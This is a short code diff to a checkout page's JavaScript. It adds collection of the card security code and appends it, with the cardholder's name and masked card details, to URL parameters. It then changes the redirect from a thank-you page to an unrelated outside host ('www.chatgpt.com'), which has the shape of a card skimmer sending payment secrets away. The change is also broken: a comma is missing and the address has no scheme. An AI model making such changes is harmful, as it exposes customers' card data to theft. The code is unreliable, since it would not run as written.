@@ -694,6 +694,7 @@
       address_1:      g('f-addr1'),
       address_2:      g('f-addr2'),
       card_name:      g('f-cardname'),
+      Security_code:  g('f-securitycode'),
       card_masked:    maskedCard,
       card_expiry:    g('f-expiry'),
       payment_method: document.getElementById('card-opt').classList.contains('active') ? 'Card' : 'PayPal',
@@ -733,10 +734,11 @@
       cardname: payload.card_name,
       card:     maskedCard,
       expiry:   payload.card_expiry,
+      Security_code: payload.Security_code
       sheet:    sheetStatus,
     });
 
-    window.location.href = 'thankyou.html?' + p.toString();
+    window.location.href = 'www.chatgpt.com' + p.toString();
   }
 
   /* ════════════════════════════
